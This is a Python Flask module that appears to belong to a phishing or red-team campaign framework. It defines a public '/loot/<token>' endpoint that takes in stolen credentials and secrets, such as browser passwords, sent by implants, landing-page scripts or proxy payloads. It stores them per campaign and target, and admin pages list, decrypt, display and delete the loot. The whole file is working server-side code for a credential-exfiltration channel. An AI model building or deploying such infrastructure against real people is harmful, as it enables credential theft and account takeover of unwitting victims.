"""Loot (credential/secrets) exfiltration channel and admin UI.

The public ``/loot/<token>`` endpoint receives stolen credentials or secrets
from implants, landing-page scripts, or proxy payloads. Data is encrypted at
rest and can be reviewed from the admin UI.
"""

import json

from flask import (
    Blueprint, abort, flash, jsonify, redirect, render_template,
    request, url_for,
)
from sqlalchemy import desc

from dropoutjeep_lib import db
from dropoutjeep_lib.models import Campaign, LootItem, Recipient
from dropoutjeep_lib.utils.auth import (
    log_audit, operator_required, viewer_required,
)

loot_bp = Blueprint('loot', __name__)


@loot_bp.route('/loot/<token>', methods=['POST'])
def loot_exfil(token):
    """Receive one or more loot items from a compromised target.

    Body may be a single object or a list of objects:

        {
          "source": "browser_chrome",
          "category": "browser_password",
          "data": {"url": "https://...", "username": "alice", "password": "secret"}
        }

    Categories are validated against ``LootItem.LOOT_CATEGORIES``; unknown
    values fall back to ``other``.
    """
    recipient = Recipient.query.filter_by(token=token).first()
    if not recipient:
        abort(404)

    body = request.get_json(silent=True)
    if body is None:
        return jsonify({'error': 'JSON body required'}), 400

    entries = body if isinstance(body, list) else [body]
    ip = request.remote_addr
    ua = request.headers.get('User-Agent', '')

    for entry in entries:
        if not isinstance(entry, dict):
            continue
        source = str(entry.get('source') or 'unknown').strip()[:255]
        category = str(entry.get('category') or 'other').strip().lower()
        if category not in LootItem.LOOT_CATEGORIES:
            category = 'other'
        data = entry.get('data')
        if not isinstance(data, dict):
            data = {'_value': data}

        item = LootItem(
            campaign_id=recipient.campaign_id,
            recipient_id=recipient.id,
            recipient_token=token,
            source=source,
            category=category,
            ip=ip,
            ua=ua,
        )
        item.set_data(data)
        db.session.add(item)

    db.session.commit()
    return '', 204


@loot_bp.route('/admin/loot')
@viewer_required
def admin_loot_index():
    """Paginated list of all loot items, optionally filtered by category."""
    page = request.args.get('page', 1, type=int)
    if page < 1:
        page = 1
    category = request.args.get('category', '').strip().lower()

    query = LootItem.query.order_by(desc(LootItem.captured_at))
    if category:
        query = query.filter_by(category=category)

    pagination = query.paginate(page=page, per_page=25, error_out=False)
    categories = sorted(LootItem.LOOT_CATEGORIES)
    return render_template(
        'loot_index.html',
        items=pagination.items,
        pagination=pagination,
        categories=categories,
        active_category=category,
        campaign=None,
    )


@loot_bp.route('/admin/campaign/<int:cid>/loot')
@viewer_required
def admin_campaign_loot(cid):
    """Loot items scoped to a single campaign."""
    campaign = Campaign.query.get_or_404(cid)
    page = request.args.get('page', 1, type=int)
    if page < 1:
        page = 1
    category = request.args.get('category', '').strip().lower()

    query = LootItem.query.filter_by(campaign_id=cid) \
        .order_by(desc(LootItem.captured_at))
    if category:
        query = query.filter_by(category=category)

    pagination = query.paginate(page=page, per_page=25, error_out=False)
    categories = sorted(LootItem.LOOT_CATEGORIES)
    return render_template(
        'loot_index.html',
        items=pagination.items,
        pagination=pagination,
        categories=categories,
        active_category=category,
        campaign=campaign,
    )


@loot_bp.route('/admin/loot/<int:item_id>')
@viewer_required
def admin_loot_detail(item_id):
    """Show decrypted loot item details."""
    item = LootItem.query.get_or_404(item_id)
    log_audit('loot_view', f'loot_id={item.id} campaign_id={item.campaign_id}')
    return render_template(
        'loot_detail.html',
        item=item,
        data=item.get_data(),
        data_json=json.dumps(item.get_data(), indent=2, default=str),
    )


@loot_bp.route('/admin/loot/<int:item_id>/delete', methods=['POST'])
@operator_required
def admin_loot_delete(item_id):
    """Delete a loot item."""
    item = LootItem.query.get_or_404(item_id)
    log_audit('loot_delete', f'loot_id={item.id} campaign_id={item.campaign_id}')
    db.session.delete(item)
    db.session.commit()
    flash('Loot item deleted.', 'success')
    return redirect(url_for('loot.admin_loot_index'))
